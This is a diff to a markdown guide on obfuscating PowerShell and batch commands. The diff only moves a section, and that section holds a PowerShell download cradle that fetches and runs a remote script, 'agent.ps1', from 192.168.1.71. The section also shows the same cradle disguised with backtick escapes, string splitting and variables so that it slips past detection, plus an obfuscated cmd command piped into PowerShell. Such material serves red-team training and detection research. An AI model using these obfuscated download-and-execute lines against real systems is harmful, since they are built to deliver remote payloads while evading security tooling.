@@ -248,19 +248,6 @@ The above string can be obfuscated using the **powershell special character: `**
 
 ---
 
-- String command to obfuscate<br />
-`powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
-The above string can be obfuscated using **powershell special characters:** **`** and **+** and **$var** and **'**<br />
-
-- String obfuscated<br />
-
-      $get="N`et.Web`Cli`ent"              <-- caret ` inside double quotes
-      $Dow='Do'+'wn'+'loa'+'dStri'+'ng'    <-- caret + inside single quotes
-      powershell.exe IEX (New-Object $get).$Dow('h'+'ttp'+':'+'//'+'192.168'+'.1.71/agent.ps1')
-
-![powershell obfuscation](http://i.cubeupload.com/XvV4bB.jpg)
-
----
 
 - Using an **batch** local variable inside the **powershell interpreter**
 
@@ -273,6 +260,20 @@ The above string can be obfuscated using **powershell special characters:** **`*
       c`md`.e`xe /c "s^Et va^r=Get-Date && c^md^.e^xe /c e^ch^o %var%^" | power`shell.`ex`e
 
 ![powershell obfuscation](http://i.cubeupload.com/G6rj4M.jpg)
+
+---
+
+- String command to obfuscate<br />
+`powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
+The above string can be obfuscated using **powershell special characters:** **`** and **+** and **$var** and **'**<br />
+
+- String obfuscated<br />
+
+      $get="N`et.Web`Cli`ent"              <-- caret ` inside double quotes
+      $Dow='Do'+'wn'+'loa'+'dStri'+'ng'    <-- caret + inside single quotes
+      powershell.exe IEX (New-Object $get).$Dow('h'+'ttp'+':'+'//'+'192.168'+'.1.71/agent.ps1')
+
+![powershell obfuscation](http://i.cubeupload.com/XvV4bB.jpg)
 
 ---
 
